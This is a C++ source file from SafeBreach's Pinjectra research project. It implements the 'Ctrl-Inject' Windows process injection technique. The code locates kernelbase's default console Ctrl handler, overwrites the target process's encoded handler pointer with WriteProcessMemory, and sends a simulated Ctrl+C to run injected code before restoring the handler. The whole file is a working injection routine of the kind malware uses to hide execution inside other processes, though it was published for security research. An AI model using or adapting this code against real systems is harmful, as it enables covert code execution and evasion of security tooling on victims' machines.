// Copyright (c) 2019, SafeBreach
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
//  * Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
//  * Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
//  * Neither the name of the copyright holder nor the names of its
//    contributors may be used to endorse or promote products derived from
//    this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

// Standard Include's
#include <iostream>

// Local Include's
#include "CtrlInject.h"

CodeViaCtrlInject::~CodeViaCtrlInject()
{
}

boolean CodeViaCtrlInject::inject(DWORD pid, DWORD tid) {
	DWORD process_list[2];
	DWORD process_count;
	DWORD parent_id;
	RUNTIME_MEM_ENTRY* result;
	HANDLE h;
	void* encoded_addr = NULL;
	INPUT ip;
	MODULEINFO modinfo;
	int size;
	HWND hWindow;

	NTSTATUS(*PRtlEncodeRemotePointer)(
		_In_ HANDLE ProcessHandle,
		_In_ PVOID Pointer,
		_Out_ PVOID * EncodedPointer
		) = (NTSTATUS(*)(
			_In_ HANDLE ProcessHandle,
			_In_ PVOID Pointer,
			_Out_ PVOID * EncodedPointer
			)) GetProcAddress(GetModuleHandleA("ntdll"), "RtlEncodeRemotePointer");

	HMODULE kernelbase = GetModuleHandleA("kernelbase");
	GetModuleInformation(GetCurrentProcess(), kernelbase, &modinfo, sizeof(modinfo));
	size = modinfo.SizeOfImage;
	char* kernelbase_DefaultHandler = (char*)memmem(kernelbase, size, "\x48\x83\xec\x28\xb9\x3a\x01\x00\xc0", 9); // sub rsp,28h; mov ecx,0C000013Ah (STATUS_CONTROL_C_EXIT)
	__int64 encoded = (__int64)EncodePointer(kernelbase_DefaultHandler);
	char* kernelbase_SingleHandler = (char*)memmem(kernelbase, size, &encoded, 8);

	process_count = GetConsoleProcessList(process_list, 2);
	if (process_count < 2)
	{
		// "Oops, process_count for the console < 2
		return false;
	}

	if (process_list[0] != GetCurrentProcessId())
		parent_id = process_list[0];
	else
		parent_id = process_list[1];

	FreeConsole();
	AttachConsole(pid);
	hWindow = GetConsoleWindow();
	FreeConsole();
	AttachConsole(parent_id);

	result = this->m_memwriter->write(pid, tid);

	CloseHandle(result->process);

	h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid); // PROCESS_VM_OPERATION is required for RtlEncodeRemotePointer

	(*PRtlEncodeRemotePointer)(h, result->addr, &encoded_addr);
	WriteProcessMemory(h, kernelbase_SingleHandler, &encoded_addr, 8, NULL);

	ip.type = INPUT_KEYBOARD;
	ip.ki.wScan = 0;
	ip.ki.time = 0;
	ip.ki.dwExtraInfo = 0;
	ip.ki.wVk = VK_CONTROL;
	ip.ki.dwFlags = 0; // 0 for key press
	SendInput(1, &ip, sizeof(INPUT));
	Sleep(100);
	PostMessageA(hWindow, WM_KEYDOWN, 'C', 0);

	// release the Ctrl key
	Sleep(100);
	ip.type = INPUT_KEYBOARD;
	ip.ki.wScan = 0;
	ip.ki.time = 0;
	ip.ki.dwExtraInfo = 0;
	ip.ki.wVk = VK_CONTROL;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));

	// Restore the original Ctrl handler in the target process
	(*PRtlEncodeRemotePointer)(h, kernelbase_DefaultHandler, &encoded_addr);
	WriteProcessMemory(h, kernelbase_SingleHandler, &encoded_addr, 8, NULL);

	return true;
}
